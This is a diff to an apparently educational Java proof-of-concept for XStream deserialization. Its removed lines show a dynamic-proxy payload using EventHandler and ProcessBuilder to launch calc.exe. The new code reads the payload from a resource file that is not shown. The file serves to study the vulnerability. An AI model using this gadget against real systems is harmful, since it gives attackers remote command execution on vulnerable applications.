@@ -3,6 +3,9 @@ package com.SugarP1g.deserialization.XStream;
 import com.thoughtworks.xstream.*;
 import com.thoughtworks.xstream.io.xml.DomDriver;
 
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+
 public class POC {
     public static void encode() {
         Person p = new Person();
@@ -16,7 +19,7 @@ public class POC {
 
     public static void decode() {
         String xml = "<com.huawei.icsl.Person>\n" +
-                "  <name>mi1k7ea</name>\n" +
+                "  <name>aaa</name>\n" +
                 "  <age>6</age>\n" +
                 "</com.huawei.icsl.Person>";
 
@@ -25,24 +28,20 @@ public class POC {
         p.output();
     }
 
-    public static void evil_decode() {
-        String xml = "<dynamic-proxy>\n" +
-                "        <interface>java.lang.Comparable</interface>\n" +
-                "        <handler class=\"java.beans.EventHandler\">\n" +
-                "            <target class=\"java.lang.ProcessBuilder\">\n" +
-                "                <command>\n" +
-                "                    <string>calc.exe</string>\n" +
-                "                </command>\n" +
-                "            </target>\n" +
-                "            <action>start</action>\n" +
-                "        </handler>\n" +
-                "    </dynamic-proxy>";
+    public void evil_decode() throws FileNotFoundException {
+        String filename = this.getClass().getClassLoader().getResource("XStreamPayload.xml").getPath();
+        FileInputStream xml = new FileInputStream(filename);
         XStream xstream = new XStream(new DomDriver());
         Person p = (Person) xstream.fromXML(xml);
         p.output();
     }
 
     public static void main(String[] args) {
-        evil_decode();
+        // encode();
+        try {
+            new POC().evil_decode();
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        }
     }
 }
